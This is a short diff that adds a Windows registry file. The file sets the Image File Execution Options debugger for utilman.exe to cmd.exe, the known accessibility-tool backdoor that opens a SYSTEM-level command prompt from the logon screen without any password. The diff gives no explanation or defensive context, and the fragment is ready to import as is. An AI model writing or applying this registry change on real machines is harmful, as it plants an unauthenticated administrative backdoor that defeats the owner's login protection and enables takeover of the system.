@@ -1,0 +1,3 @@
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe]
+"Debugger"="C:\\Windows\\System32\\cmd.exe"
+
